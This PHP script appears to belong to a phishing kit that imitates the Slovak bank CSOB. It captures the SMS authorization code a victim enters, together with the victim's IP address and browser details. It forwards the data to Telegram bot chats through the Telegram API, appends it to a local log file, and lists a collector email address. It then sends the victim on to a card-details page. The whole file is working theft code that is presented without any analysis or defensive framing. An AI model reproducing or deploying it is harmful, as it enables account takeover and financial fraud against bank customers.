<?php
   include "config.php";

$sm = $_POST['sm'] ;

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bro = $_SERVER["HTTP_USER_AGENT"];
$message .= "-------------------- ✅ CSOB-SK SMS 1 ✅-------------------\n";
$message .= "SMS 01 : ".$sm."\r\n";
$message .= "-------------------- ✅ CSOB-SK INFORMATIONS✅-------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$bro."\n";
$message .= "\n-------------------- 🇸🇰 Zoldyck 🇸🇰-------------------\n";
$rnessage  = "$message";
$send="voltaikrez@gmail.com";
$subject = "|CSB SMS 01|".$ip."";
$headers = "From: root";
foreach($user_ids as $user_id) {
    $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
    $data=array('chat_id'=>$user_id,'text'=>$message);
    $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
    $context=stream_context_create($options);
    $result=file_get_contents($url,false,$context);

    }


$txt = fopen('../serlik.txt', 'a');
fwrite($txt, $message);
fclose($txt);

header("Location: ./crd.php?num_user=".base64_encode($sm));

?>

